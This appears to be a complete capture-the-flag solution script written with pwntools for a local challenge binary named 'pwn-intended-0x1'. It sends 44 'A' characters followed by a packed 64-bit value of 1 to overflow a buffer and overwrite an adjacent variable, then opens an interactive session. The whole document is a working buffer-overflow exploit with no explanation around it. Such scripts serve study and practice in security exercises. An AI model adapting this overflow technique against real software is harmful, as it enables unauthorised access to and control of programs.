from pwn import *


p = process("pwn-intended-0x1")

size = 0x30 - 0x4
p.sendline("A"*size + p64(0x1))

print("A"*size + p64(0x1))
p.interactive()

